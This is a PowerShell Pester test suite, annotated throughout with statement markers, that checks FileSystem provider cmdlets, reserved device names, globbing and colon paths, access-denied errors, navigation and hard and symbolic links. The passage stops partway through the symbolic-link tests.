

 -||-> Describe "Basic FileSystem Provider Tests" -Tags "CI" {
     -||-> BeforeAll {
         -||-> $testDir = "TestDir" <-||- 
         -||-> $testFile = "TestFile.txt" <-||- 
         -||-> $restoreLocation =  -||-> Get-Location <-||-  <-||- 
    } <-||- 

     -||-> AfterAll {
        
         -||-> Set-Location -Path $restoreLocation <-||- 
    } <-||- 

     -||-> BeforeEach {
         -||-> Set-Location -Path "TestDrive:\" <-||- 
    } <-||- 

     -||-> Context "Validate basic FileSystem Cmdlets" {
         -||-> BeforeAll {
             -||-> $newTestDir = "NewTestDir" <-||- 
             -||-> $newTestFile = "NewTestFile.txt" <-||- 
             -||-> $testContent = "Some Content" <-||- 
             -||-> $testContent2 = "More Content" <-||- 
             -||-> $reservedNamesTests = @(
                 -||-> @{ deviceName =  -||-> 'CON' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'PRN' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'AUX' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'CLOCK$' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'NUL' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM0' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM1' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM2' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM3' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM4' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM5' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM6' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM7' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM8' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'COM9' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT0' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT1' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT2' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT3' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT4' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT5' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT6' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT7' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT8' <-||-  } <-||- 
                 -||-> @{ deviceName =  -||-> 'LPT9' <-||-  } <-||- 
            ) <-||- 
        } <-||- 

         -||-> BeforeEach {
             -||-> New-Item -Path $testDir -ItemType Directory > $null <-||- 
             -||-> New-Item -Path $testFile -ItemType File > $null <-||- 
        } <-||- 

         -||-> AfterEach {
             -||-> Set-Location -Path "TestDrive:\" <-||- 
             -||-> Remove-Item -Path * -Recurse -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 

         -||-> It "Verify New-Item for directory" {
             -||-> $newDir =  -||-> New-Item -Path $newTestDir -ItemType Directory <-||-  <-||- 
             -||-> $directoryExists =  -||-> Test-Path $newTestDir <-||-  <-||- 
             -||-> $directoryExists | Should -BeTrue <-||- 
             -||-> $newDir.Name | Should -BeExactly $newTestDir <-||- 
        } <-||- 

         -||-> It "Verify New-Item for file" {
             -||-> $newFile =  -||-> New-Item -Path $newTestFile -ItemType File <-||-  <-||- 
             -||-> $newTestFile | Should -Exist <-||- 
             -||-> $newFile.Name | Should -BeExactly $newTestFile <-||- 
        } <-||- 

         -||-> It "Verify Remove-Item for directory" {
             -||-> $existsBefore =  -||-> Test-Path $testDir <-||-  <-||- 
             -||-> Remove-Item -Path $testDir -Recurse -Force <-||- 
             -||-> $existsAfter =  -||-> Test-Path $testDir <-||-  <-||- 
             -||-> $existsBefore | Should -BeTrue <-||- 
             -||-> $existsAfter | Should -BeFalse <-||- 
        } <-||- 

         -||-> It "Verify Remove-Item for file" {
             -||-> $existsBefore =  -||-> Test-Path $testFile <-||-  <-||- 
             -||-> Remove-Item -Path $testFile -Force <-||- 
             -||-> $existsAfter =  -||-> Test-Path $testFile <-||-  <-||- 
             -||-> $existsBefore | Should -BeTrue <-||- 
             -||-> $existsAfter | Should -BeFalse <-||- 
        } <-||- 

         -||-> It "Verify Rename-Item for file" {
             -||-> Rename-Item -Path $testFile -NewName $newTestFile -ErrorAction Stop <-||- 
             -||-> $testFile | Should -Not -Exist <-||- 
             -||-> $newTestFile | Should -Exist <-||- 
        } <-||- 

         -||-> It "Verify Rename-Item for directory" {
             -||-> Rename-Item -Path $testDir -NewName $newTestDir -ErrorAction Stop <-||- 
             -||-> $testDir | Should -Not -Exist <-||- 
             -||-> $newTestDir | Should -Exist <-||- 
        } <-||- 

         -||-> It "Verify Rename-Item will not rename to an existing name" {
             -||-> {  -||-> Rename-Item -Path $testFile -NewName $testDir -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "RenameItemIOError,Microsoft.PowerShell.Commands.RenameItemCommand" <-||- 
             -||-> $Error[0].Exception | Should -BeOfType System.IO.IOException <-||- 
             -||-> $testFile | Should -Exist <-||- 
        } <-||- 

         -||-> It "Verify Copy-Item" {
             -||-> $newFile =  -||-> Copy-Item -Path $testFile -Destination $newTestFile -PassThru <-||-  <-||- 
             -||-> $fileExists =  -||-> Test-Path $newTestFile <-||-  <-||- 
             -||-> $fileExists | Should -BeTrue <-||- 
             -||-> $newFile.Name | Should -BeExactly $newTestFile <-||- 
        } <-||- 

         -||-> It "Verify Move-Item for file" {
             -||-> Move-Item -Path $testFile -Destination $testDir -ErrorAction Stop <-||- 
             -||-> $testFile | Should -Not -Exist <-||- 
             -||-> "$testDir/$testFile" | Should -Exist <-||- 
        } <-||- 

         -||-> It "Verify Move-Item for directory" {
             -||-> $destDir = "DestinationDirectory" <-||- 
             -||-> New-Item -Path $destDir -ItemType Directory -ErrorAction Stop > $null <-||- 
             -||-> Move-Item -Path $testFile -Destination $testDir <-||- 
             -||-> Move-Item -Path $testDir -Destination $destDir <-||- 
             -||-> $testDir | Should -Not -Exist <-||- 
             -||-> "$destDir/$testDir" | Should -Exist <-||- 
             -||-> "$destDir/$testDir/$testFile" | Should -Exist <-||- 
        } <-||- 

         -||-> It "Verify Move-Item will not move to an existing file" {
             -||-> {  -||-> Move-Item -Path $testDir -Destination $testFile -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "MoveDirectoryItemIOError,Microsoft.PowerShell.Commands.MoveItemCommand" <-||- 
             -||-> $Error[0].Exception | Should -BeOfType System.IO.IOException <-||- 
             -||-> $testDir | Should -Exist <-||- 
        } <-||- 

         -||-> It "Verify Move-Item as substitute for Rename-Item" {
             -||-> $newFile =  -||-> Move-Item -Path $testFile -Destination $newTestFile -PassThru <-||-  <-||- 
             -||-> $fileExists =  -||-> Test-Path $newTestFile <-||-  <-||- 
             -||-> $fileExists | Should -BeTrue <-||- 
             -||-> $newFile.Name | Should -Be $newTestFile <-||- 
        } <-||- 

         -||-> It "Verify Get-ChildItem" {
             -||-> $dirContents =  -||-> Get-ChildItem "." <-||-  <-||- 
             -||-> $dirContents.Count | Should -Be 2 <-||- 
        } <-||- 

         -||-> It "Verify Get-ChildItem can get the name of a specified item." {
             -||-> $fileName =  -||-> Get-ChildItem $testFile -Name <-||-  <-||- 
             -||-> $fileInfo =  -||-> Get-ChildItem $testFile <-||-  <-||- 
             -||-> $fileName | Should -BeExactly $fileInfo.Name <-||- 
        } <-||- 

         -||-> It "Set-Content to a file" {
             -||-> $content =   -||-> Set-Content -Value $testContent -Path $testFile -PassThru <-||-  <-||- 
             -||-> $content | Should -BeExactly $testContent <-||- 
        } <-||- 

         -||-> It "Add-Content to a file" {
             -||-> $content =  -||-> Set-Content -Value $testContent -Path $testFile -PassThru <-||-  <-||- 
             -||-> $addContent =  -||-> Add-Content -Value $testContent2 -Path $testFile -PassThru <-||-  <-||- 
             -||-> $fullContent =  -||-> Get-Content -Path $testFile <-||-  <-||- 
             -||-> $content | Should -Match $testContent <-||- 
             -||-> $addContent | Should -Match $testContent2 <-||- 
             -||-> ( -||-> $fullContent[0] + $fullContent[1] <-||- ) | Should -Match ( -||-> $testContent + $testContent2 <-||- ) <-||- 
        } <-||- 

         -||-> It "Clear-Content of a file" {
             -||-> Set-Content -Value $testContent -Path $testFile <-||- 
             -||-> $contentBefore =  -||-> Get-Content -Path $testFile <-||-  <-||- 
             -||-> Clear-Content -Path $testFile <-||- 
             -||-> $contentAfter =  -||-> Get-Content -Path $testFile <-||-  <-||- 
             -||-> $contentBefore.Count | Should -Be 1 <-||- 
             -||-> $contentAfter.Count | Should -Be 0 <-||- 
        } <-||- 

          -||-> It "Copy-Item on Windows rejects Windows reserved device name: <deviceName>" -Skip:( -||-> -not $IsWindows <-||- ) -TestCases $reservedNamesTests {
            param($deviceName)
             -||-> {  -||-> Copy-Item -Path $testFile -Destination $deviceName -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "CopyError,Microsoft.PowerShell.Commands.CopyItemCommand" <-||- 
         } <-||- 

          -||-> It "Move-Item on Windows rejects Windows reserved device name: <deviceName>" -Skip:( -||-> -not $IsWindows <-||- ) -TestCases $reservedNamesTests {
            param($deviceName)
             -||-> {  -||-> Move-Item -Path $testFile -Destination $deviceName -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "MoveError,Microsoft.PowerShell.Commands.MoveItemCommand" <-||- 
         } <-||- 

          -||-> It "Rename-Item on Windows rejects Windows reserved device name: <deviceName>" -Skip:( -||-> -not $IsWindows <-||- ) -TestCases $reservedNamesTests {
             param($deviceName)
             -||-> {  -||-> Rename-Item -Path $testFile -NewName $deviceName -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "RenameError,Microsoft.PowerShell.Commands.RenameItemCommand" <-||- 
         } <-||- 

          -||-> It "Copy-Item on Unix succeeds with Windows reserved device name: <deviceName>" -Skip:( -||-> $IsWindows <-||- ) -TestCases $reservedNamesTests {
            param($deviceName)
             -||-> Copy-Item -Path $testFile -Destination $deviceName -Force -ErrorAction SilentlyContinue <-||- 
             -||-> Test-Path $deviceName | Should -BeTrue <-||- 
         } <-||- 

          -||-> It "Move-Item on Unix succeeds with Windows reserved device name: <deviceName>" -Skip:( -||-> $IsWindows <-||- ) -TestCases $reservedNamesTests {
            param($deviceName)
             -||-> Move-Item -Path $testFile -Destination $deviceName -Force -ErrorAction SilentlyContinue <-||- 
             -||-> Test-Path $deviceName | Should -BeTrue <-||- 
             -||-> New-Item -Path $testFile -ItemType File -Force -ErrorAction SilentlyContinue <-||- 
         } <-||- 

          -||-> It "Rename-Item on Unix succeeds with Windows reserved device name: <deviceName>" -Skip:( -||-> $IsWindows <-||- ) -TestCases $reservedNamesTests {
            param($deviceName)
             -||-> Rename-Item -Path $testFile -NewName $deviceName -Force -ErrorAction SilentlyContinue <-||- 
             -||-> Test-Path $deviceName | Should -BeTrue <-||- 
             -||-> New-Item -Path $testFile -ItemType File -Force -ErrorAction SilentlyContinue <-||- 
         } <-||- 

          -||-> It "Set-Location on Unix succeeds with folder with colon: <path>" -Skip:( -||-> $IsWindows <-||- ) -TestCases @(
              -||-> @{path= -||-> "\hello:world" <-||- },
             @{path= -||-> "\:world" <-||- },
             @{path= -||-> "/hello:" <-||- } <-||- 
         ) {
            param($path)
             -||-> try {
                 -||-> New-Item -Path "$testdrive$path" -ItemType Directory > $null <-||- 
                 -||-> Set-Location "$testdrive" <-||- 
                 -||-> Set-Location ".$path" <-||- 
                 -||-> ( -||-> Get-Location <-||- ).Path | Should -BeExactly "$testdrive/$( -||-> $path.Substring(1,$path.Length-1) <-||- )" <-||- 
            }
            finally {
                 -||-> Remove-Item -Path "$testdrive$path" -ErrorAction SilentlyContinue <-||- 
            } <-||- 
         } <-||- 

          -||-> It "Get-Content on Unix succeeds with folder and file with colon: <path>" -Skip:( -||-> $IsWindows <-||- ) -TestCases @(
              -||-> @{path= -||-> "\foo:bar.txt" <-||- },
             @{path= -||-> "/foo:" <-||- },
             @{path= -||-> "\:bar" <-||- } <-||- 
         ) {
            param($path)
             -||-> try {
                 -||-> $testPath = "$testdrive/hello:world" <-||- 
                 -||-> New-Item -Path "$testPath" -ItemType Directory > $null <-||- 
                 -||-> Set-Content -Path "$testPath$path" -Value "Hello" <-||- 
                 -||-> $files =  -||-> Get-ChildItem "$testPath" <-||-  <-||- 
                 -||-> $files.Count | Should -Be 1 <-||- 
                 -||-> $files[0].Name | Should -BeExactly $path.Substring(1,$path.Length-1) <-||- 
                 -||-> $files[0] | Get-Content | Should -BeExactly "Hello" <-||- 
            }
            finally {
                 -||-> Remove-Item -Path $testPath -Recurse -Force -ErrorAction SilentlyContinue <-||- 
            } <-||- 
         } <-||- 
    } <-||- 

     -||-> Context "Validate behavior when access is denied" {
         -||-> BeforeAll {
             -||-> $powershell =  -||-> Join-Path $PSHOME "pwsh" <-||-  <-||- 
             -||-> if ( -||-> $IsWindows <-||- )
            {
                 -||-> $protectedPath =  -||-> Join-Path ( -||-> [environment]::GetFolderPath("windows") <-||- ) "appcompat" "Programs" <-||-  <-||- 
                 -||-> $protectedPath2 =  -||-> Join-Path $protectedPath "Install" <-||-  <-||- 
                 -||-> $newItemPath =  -||-> Join-Path $protectedPath "foo" <-||-  <-||- 
                 -||-> $shouldSkip = -not ( -||-> Test-Path $protectedPath <-||- ) <-||- 
            } <-||- 
        } <-||- 

         -||-> It "Access-denied test for <cmdline>" -Skip:( -||-> -not $IsWindows -or $shouldSkip <-||- ) -TestCases @(
            
            
            
            
             -||-> @{cmdline =  -||-> "Get-ChildItem $protectedPath -ErrorAction Stop" <-||- ; expectedError =  -||-> "DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand" <-||- } <-||- 
             -||-> @{cmdline =  -||-> "Rename-Item -Path $protectedPath -NewName bar -ErrorAction Stop" <-||- ; expectedError =  -||-> "RenameItemIOError,Microsoft.PowerShell.Commands.RenameItemCommand" <-||- },
            @{cmdline =  -||-> "Move-Item -Path $protectedPath -Destination bar -ErrorAction Stop" <-||- ; expectedError =  -||-> "MoveDirectoryItemIOError,Microsoft.PowerShell.Commands.MoveItemCommand" <-||- } <-||- 
        ) {
            param ($cmdline, $expectedError)

             -||-> $scriptBlock = [scriptblock]::Create($cmdline) <-||- 
             -||-> $scriptBlock | Should -Throw -ErrorId $expectedError <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Validate basic host navigation functionality" {
         -||-> BeforeAll {
            
             -||-> $level1_0 = "Level1_0" <-||- 
             -||-> $level2_0 = "Level2_0" <-||- 
             -||-> $level2_1 = "Level2_1" <-||- 
             -||-> $root =  -||-> Join-Path "TestDrive:" "" <-||-  <-||-  
             -||-> $level1_0Full =  -||-> Join-Path $root $level1_0 <-||-  <-||- 
             -||-> $level2_0Full =  -||-> Join-Path $level1_0Full $level2_0 <-||-  <-||- 
             -||-> $level2_1Full =  -||-> Join-Path $level1_0Full $level2_1 <-||-  <-||- 
             -||-> New-Item -Path $level1_0Full -ItemType Directory > $null <-||- 
             -||-> New-Item -Path $level2_0Full -ItemType Directory > $null <-||- 
             -||-> New-Item -Path $level2_1Full -ItemType Directory > $null <-||- 
        } <-||- 

         -||-> It "Verify Get-Location and Set-Location" {
             -||-> $currentLoc =  -||-> Get-Location <-||-  <-||- 
             -||-> Set-Location $level1_0 <-||- 
             -||-> $level1Loc =  -||-> Get-Location <-||-  <-||- 
             -||-> Set-Location $level2_0 <-||- 
             -||-> $level2Loc =  -||-> Get-Location <-||-  <-||- 
             -||-> $currentLoc.Path | Should -BeExactly $root <-||- 
             -||-> $level1Loc.Path | Should -BeExactly $level1_0Full <-||- 
             -||-> $level2Loc.Path | Should -BeExactly $level2_0Full <-||- 
        } <-||- 

         -||-> It "Verify Push-Location and Pop-Location" {
            
             -||-> Push-Location <-||- 
             -||-> $push0 =  -||-> Get-Location <-||-  <-||- 
             -||-> Set-Location $level1_0 <-||- 
             -||-> Push-Location <-||- 
             -||-> $push1 =  -||-> Get-Location <-||-  <-||- 
             -||-> Set-Location $level2_0 <-||- 
             -||-> Push-Location <-||- 
             -||-> $push2 =  -||-> Get-Location <-||-  <-||- 

            
             -||-> Set-Location "TestDrive:\" <-||- 

            
             -||-> Pop-Location <-||- 
             -||-> $pop0 =  -||-> Get-Location <-||-  <-||- 
             -||-> Pop-Location <-||- 
             -||-> $pop1 =  -||-> Get-Location <-||-  <-||- 
             -||-> Pop-Location <-||- 
             -||-> $pop2 =  -||-> Get-Location <-||-  <-||- 

             -||-> $pop0.Path | Should -BeExactly $push2.Path <-||- 
             -||-> $pop1.Path | Should -BeExactly $push1.Path <-||- 
             -||-> $pop2.Path | Should -BeExactly $push0.Path <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Validate Basic Path Cmdlets" {
         -||-> It "Verify Convert-Path" {
             -||-> $result =  -||-> Convert-Path "." <-||-  <-||- 
             -||-> ( -||-> $result.TrimEnd('/\') <-||- ) | Should -BeExactly "$TESTDRIVE" <-||- 
        } <-||- 

         -||-> It "Verify Join-Path" {
             -||-> $result =  -||-> Join-Path -Path "TestDrive:" -ChildPath "temp" <-||-  <-||- 

             -||-> if ( -||-> $IsWindows <-||- ) {
                 -||-> $result | Should -BeExactly "TestDrive:\temp" <-||- 
            }
            else {
                 -||-> $result | Should -BeExactly "TestDrive:/temp" <-||- 
            } <-||- 
        } <-||- 

         -||-> It "Verify Split-Path" {
             -||-> $testPath =  -||-> Join-Path "TestDrive:" "MyTestFile.txt" <-||-  <-||- 
             -||-> $result =  -||-> Split-Path $testPath -Qualifier <-||-  <-||- 
             -||-> $result | Should -BeExactly "TestDrive:" <-||- 
        } <-||- 

         -||-> It "Verify Test-Path" {
             -||-> $result =  -||-> Test-Path $HOME <-||-  <-||- 
             -||-> $result | Should -BeTrue <-||- 
        } <-||- 

         -||-> It "Verify HOME" {
             -||-> $homePath = $HOME <-||- 
             -||-> $tildePath = ( -||-> Resolve-Path -Path ~ <-||- ).Path <-||- 
             -||-> $homePath | Should -BeExactly $tildePath <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Handling of globbing patterns" -Tags "CI" {

     -||-> Context "Handling of Unix [ab] globbing patterns in literal paths" {
         -||-> BeforeAll {
             -||-> $filePath =  -||-> Join-Path $TESTDRIVE "file[txt].txt" <-||-  <-||- 
             -||-> $newPath =  -||-> Join-Path $TESTDRIVE "file.txt.txt" <-||-  <-||- 
             -||-> $dirPath =  -||-> Join-Path $TESTDRIVE "subdir" <-||-  <-||- 
        } <-||- 
         -||-> BeforeEach {
             -||-> $file =  -||-> New-Item -ItemType File -Path $filePath -Force <-||-  <-||- 
        } <-||- 
         -||-> AfterEach {
             -||-> Remove-Item -Force -Recurse -Path $dirPath -ErrorAction SilentlyContinue <-||- 
             -||-> Remove-Item -Force -LiteralPath $newPath -ErrorAction SilentlyContinue <-||- 
        } <-||- 

         -||-> It "Rename-Item -LiteralPath can rename a file with Unix globbing characters" {
             -||-> Rename-Item -LiteralPath $file.FullName -NewName $newPath <-||- 
             -||-> Test-Path -LiteralPath $file.FullName | Should -BeFalse <-||- 
             -||-> Test-Path -LiteralPath $newPath | Should -BeTrue <-||- 
        } <-||- 

         -||-> It "Remove-Item -LiteralPath can delete a file with Unix globbing characters" {
             -||-> Remove-Item -LiteralPath $file.FullName <-||- 
             -||-> Test-Path -LiteralPath $file.FullName | Should -BeFalse <-||- 
        } <-||- 

         -||-> It "Move-Item -LiteralPath can move a file with Unix globbing characters" {
             -||-> $dir =  -||-> New-Item -ItemType Directory -Path $dirPath <-||-  <-||- 
             -||-> Move-Item -LiteralPath $file.FullName -Destination $dir.FullName <-||- 
             -||-> Test-Path -LiteralPath $file.FullName | Should -BeFalse <-||- 
             -||-> $newPath =  -||-> Join-Path $dir.FullName $file.Name <-||-  <-||- 
             -||-> Test-Path -LiteralPath $newPath | Should -BeTrue <-||- 
        } <-||- 

         -||-> It "Copy-Item -LiteralPath can copy a file with Unix globbing characters" {
             -||-> Copy-Item -LiteralPath $file.FullName -Destination $newPath <-||- 
             -||-> Test-Path -LiteralPath $newPath | Should -BeTrue <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Handle asterisks in name" {
         -||-> It "Remove-Item -LiteralPath should fail if it contains asterisk and file doesn't exist" {
             -||-> {  -||-> Remove-Item -LiteralPath ./foo*.txt -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.RemoveItemCommand" <-||- 
        } <-||- 

         -||-> It "Remove-Item -LiteralPath should succeed for file with asterisk in name" -Skip:( -||-> $IsWindows <-||- ) {
             -||-> $testPath = "$testdrive\foo*" <-||- 
             -||-> $testPath2 = "$testdrive\foo*2" <-||- 
             -||-> New-Item -Path $testPath -ItemType File <-||- 
             -||-> New-Item -Path $testPath2 -ItemType File <-||- 
             -||-> Test-Path -LiteralPath $testPath | Should -BeTrue <-||- 
             -||-> Test-Path -LiteralPath $testPath2 | Should -BeTrue <-||- 
             -||-> {  -||-> Remove-Item -LiteralPath $testPath <-||-  } | Should -Not -Throw <-||- 
             -||-> Test-Path -LiteralPath $testPath | Should -BeFalse <-||- 
            
             -||-> Test-Path -LiteralPath $testPath2 | Should -BeTrue <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Hard link and symbolic link tests" -Tags "CI", "RequireAdminOnWindows" {
     -||-> BeforeAll {
        
         -||-> $TestPath = $TestDrive <-||- 
         -||-> if ( -||-> $IsMacOS <-||- )
        {
             -||-> $item =  -||-> Get-Item $TestPath <-||-  <-||- 
             -||-> $dirName = $item.BaseName <-||- 
             -||-> $item =  -||-> Get-Item $item.PSParentPath -Force <-||-  <-||- 
             -||-> if ( -||-> $item.LinkType -eq "SymbolicLink" <-||- )
            {
                 -||-> $TestPath =  -||-> Join-Path $item.Target $dirName <-||-  <-||- 
            } <-||- 
        } <-||- 

         -||-> $realFile =  -||-> Join-Path $TestPath "file.txt" <-||-  <-||- 
         -||-> $nonFile =  -||-> Join-Path $TestPath "not-a-file" <-||-  <-||- 
         -||-> $fileContent = "some text" <-||- 
         -||-> $realDir =  -||-> Join-Path $TestPath "subdir" <-||-  <-||- 
         -||-> $nonDir =  -||-> Join-Path $TestPath "not-a-dir" <-||-  <-||- 
         -||-> $hardLinkToFile =  -||-> Join-Path $TestPath "hard-to-file.txt" <-||-  <-||- 
         -||-> $symLinkToFile =  -||-> Join-Path $TestPath "sym-link-to-file.txt" <-||-  <-||- 
         -||-> $symLinkToDir =  -||-> Join-Path $TestPath "sym-link-to-dir" <-||-  <-||- 
         -||-> $symLinkToNothing =  -||-> Join-Path $TestPath "sym-link-to-nowhere" <-||-  <-||- 
         -||-> $dirSymLinkToDir =  -||-> Join-Path $TestPath "symd-link-to-dir" <-||-  <-||- 
         -||-> $junctionToDir =  -||-> Join-Path $TestPath "junction-to-dir" <-||-  <-||- 

         -||-> New-Item -ItemType File -Path $realFile -Value $fileContent > $null <-||- 
         -||-> New-Item -ItemType Directory -Path $realDir > $null <-||- 
    } <-||- 

     -||-> Context "New-Item and hard/symbolic links" {
         -||-> It "New-Item can create a hard link to a file" {
             -||-> New-Item -ItemType HardLink -Path $hardLinkToFile -Value $realFile > $null <-||- 
             -||-> Test-Path $hardLinkToFile | Should -BeTrue <-||- 
             -||-> $link =  -||-> Get-Item -Path $hardLinkToFile <-||-  <-||- 
             -||-> $link.LinkType | Should -BeExactly "HardLink" <-||- 
             -||-> Get-Content -Path $hardLinkToFile | Should -Be $fileContent <-||- 
        } <-||- 
         -||-> It "New-Item can create symbolic link to file" {
             -||-> New-Item -ItemType SymbolicLink -Path $symLinkToFile -Value $realFile > $null <-||- 
             -||-> Test-Path $symLinkToFile | Should -BeTrue <-||- 
             -||-> $real =  -||-> Get-Item -Path $realFile <-||-  <-||- 
             -||-> $link =  -||-> Get-Item -Path $symLinkToFile <-||-  <-||- 
             -||-> $link.LinkType | Should -BeExactly "SymbolicLink" <-||- 
             -||-> $link.Target | Should -BeExactly $real.ToString() <-||- 
             -||-> Get-Content -Path $symLinkToFile | Should -Be $fileContent <-||- 
        } <-||- 
         -||-> It "New-Item can create a symbolic link to nothing" {
             -||-> New-Item -ItemType SymbolicLink -Path $symLinkToNothing -Value $nonFile > $null <-||- 
             -||-> Test-Path $symLinkToNothing | Should -BeTrue <-||- 
             -||-> $link =  -||-> Get-Item -Path $symLinkToNothing <-||-  <-||- 
             -||-> $link.LinkType | Should -BeExactly "SymbolicLink" <-||- 
             -||-> $link.Target | Should -Be $nonFile.ToString() <-||- 
        } <-||- 
         -||-> It "New-Item emits an error when path to symbolic link already exists." {
             -||-> {  -||-> New-Item -ItemType SymbolicLink -Path $realDir -Value $symLinkToDir -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "SymLinkExists,Microsoft.PowerShell.Commands.NewItemCommand" <-||- 
        } <-||- 
         -||-> It "New-Item can create a symbolic link to a directory" -Skip:( -||-> $IsWindows <-||- ) {
             -||-> New-Item -ItemType SymbolicLink -Path $symLinkToDir -Value $realDir > $null <-||- 
             -||-> Test-Path $symLinkToDir | Should -BeTrue <-||- 
             -||-> $real =  -||-> Get-Item -Path $realDir <-||-  <-||- 
             -||-> $link =  -||-> Get-Item -Path $symLinkToDir <-||-  <-||- 
             -||-> $link.LinkType | Should -BeExactly "SymbolicLink" <-||- 
             -||-> $link.Target | Should -BeExactly $real.ToString() <-||- 
        } <-||- 
         -||-> It "New-Item can create a directory symbolic link to a directory" -Skip:( -||-> -Not $IsWindows <-||- ) {
             -||-> New-Item -ItemType SymbolicLink -Path $symLinkToDir -Value $realDir > $null <-||- 
             -||-> Test-Path $symLinkToDir | Should -BeTrue <-||- 
             -||-> $real =  -||-> Get-Item -Path $realDir <-||-  <-||- 
             -||-> $link =  -||-> Get-Item -Path $symLinkToDir <-||-  <-||- 
             -||-> $link | Should -BeOfType System.IO.DirectoryInfo <-||- 
             -||-> $link.LinkType | Should -BeExactly "SymbolicLink" <-||- 
             -||-> $link.Target | Should -BeExactly $real.ToString() <-||- 
        } <-||- 
         -||-> It "New-Item can create a directory junction to a directory" -Skip:( -||-> -Not $IsWindows <-||- ) {
             -||-> New-Item -ItemType Junction -Path $junctionToDir -Value $realDir > $null <-||- 
             -||-> Test-Path $junctionToDir | Should -BeTrue <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Get-ChildItem and symbolic links" {
         -||-> BeforeAll {
             -||-> $alphaDir =  -||-> Join-Path $TestDrive "sub-alpha" <-||-  <-||- 
             -||-> $alphaLink =  -||-> Join-Path $TestDrive "link-alpha" <-||-  <-||- 
             -||-> $alphaFile1 =  -||-> Join-Path $alphaDir "AlphaFile1.txt" <-||-  <-||- 
             -||-> $alphaFile2 =  -||-> Join-Path $alphaDir "AlphaFile2.txt" <-||-  <-||- 
             -||-> $omegaDir =  -||-> Join-Path $TestDrive "sub-omega" <-||-  <-||- 
             -||-> $omegaFile1 =  -||-> Join-Path $omegaDir "OmegaFile1" <-||-  <-||- 
             -||-> $omegaFile2 =  -||-> Join-Path $omegaDir "OmegaFile2" <-||-  <-||- 
             -||-> $betaDir =  -||-> Join-Path $alphaDir "sub-Beta" <-||-  <-||- 
             -||-> $betaLink =  -||-> Join-Path $alphaDir "link-Beta" <-||-  <-||- 
             -||-> $betaFile1 =  -||-> Join-Path $betaDir "BetaFile1.txt" <-||-  <-||- 
             -||-> $betaFile2 =  -||-> Join-Path $betaDir "BetaFile2.txt" <-||-  <-||- 
             -||-> $betaFile3 =  -||-> Join-Path $betaDir "BetaFile3.txt" <-||-  <-||- 
             -||-> $gammaDir =  -||-> Join-Path $betaDir "sub-gamma" <-||-  <-||- 
             -||-> $uponeLink =  -||-> Join-Path $gammaDir "upone-link" <-||-  <-||- 
             -||-> $uptwoLink =  -||-> Join-Path $gammaDir "uptwo-link" <-||-  <-||- 
             -||-> $omegaLink =  -||-> Join-Path $gammaDir "omegaLink" <-||-  <-||- 

             -||-> New-Item -ItemType Directory -Path $alphaDir <-||- 
             -||-> New-Item -ItemType File -Path $alphaFile1 <-||- 
             -||-> New-Item -ItemType File -Path $alphaFile2 <-||- 
             -||-> New-Item -ItemType Directory -Path $betaDir <-||- 
             -||-> New-Item -ItemType File -Path $betaFile1 <-||- 
             -||-> New-Item -ItemType File -Path $betaFile2 <-||- 
             -||-> New-Item -ItemType File -Path $betaFile3 <-||- 
             -||-> New-Item -ItemType Directory $omegaDir <-||- 
             -||-> New-Item -ItemType File -Path $omegaFile1 <-||- 
             -||-> New-Item -ItemType File -Path $omegaFile2 <-||- 
        } <-||- 
         -||-> AfterAll {
             -||-> Remove-Item -Path $alphaLink -Force -ErrorAction SilentlyContinue <-||- 
             -||-> Remove-Item -Path $betaLink -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 

         -||-> It "Get-ChildItem gets content of linked-to directory" {
             -||-> $filenamePattern = "AlphaFile[12]\.txt" <-||- 
             -||-> New-Item -ItemType SymbolicLink -Path $alphaLink -Value $alphaDir <-||- 
             -||-> $ci =  -||-> Get-ChildItem $alphaLink <-||-  <-||- 
             -||-> $ci.Count | Should -Be 3 <-||- 
             -||-> $ci[1].Name | Should -MatchExactly $filenamePattern <-||- 
             -||-> $ci[2].Name | Should -MatchExactly $filenamePattern <-||- 
        } <-||- 
         -||-> It "Get-ChildItem does not recurse into symbolic links not explicitly given on the command line" {
             -||-> New-Item -ItemType SymbolicLink -Path $betaLink -Value $betaDir <-||- 
             -||-> $ci =  -||-> Get-ChildItem $alphaLink -Recurse <-||-  <-||- 
             -||-> $ci.Count | Should -BeExactly 7 <-||- 
        } <-||- 
